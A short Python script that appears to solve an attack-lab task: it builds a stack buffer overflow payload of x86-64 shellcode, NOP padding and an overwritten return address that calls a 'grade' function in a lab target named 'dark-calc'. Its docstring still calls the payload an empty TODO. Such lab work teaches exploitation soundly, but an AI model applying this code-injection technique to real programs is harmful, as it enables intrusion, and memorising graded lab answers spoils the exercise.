#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

BUF   = 0x721000800FD0
GRADE = 0x401A87

sc  = b"\x6a\x04"
sc += b"\x5f"
sc += b"\x48\xb8" + struct.pack("<Q", GRADE)
sc += b"\xff\xd0"
sc += b"\xc3"

payload  = sc
payload += b"\x90" * (24 - len(sc))
payload += struct.pack("<Q", BUF)

sys.stdout.buffer.write(payload)